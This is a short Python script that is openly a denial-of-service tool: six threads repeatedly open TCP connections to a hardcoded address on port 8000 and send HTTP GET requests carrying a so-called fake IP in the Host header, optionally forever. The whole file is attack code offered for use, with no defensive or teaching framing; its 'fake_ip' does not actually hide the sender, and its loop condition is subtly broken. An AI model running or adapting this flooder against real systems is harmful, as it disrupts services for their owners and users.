import socket
import threading

target = '10.97.162.34'
port = 8000
fake_ip = '182.21.20.32'

def dos_attack(forever = False,attack_num = 10):
  '''
  function for generate dos attack
  Parameters
  ----------
  forever : bool
    if set to True, the attack will be generate forever.
  '''
  while forever | attack_num>0:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((target, port))
      s.sendto(("GET login//view_logins HTTP/1.1\r\n").encode('ascii'), (target, port))
      s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
      
      attack_num -= 1
      print(attack_num)
        
      s.close()

for i in range(6):

    thread = threading.Thread(target=dos_attack)
    thread.start()

    # python dos_attack_implementation.py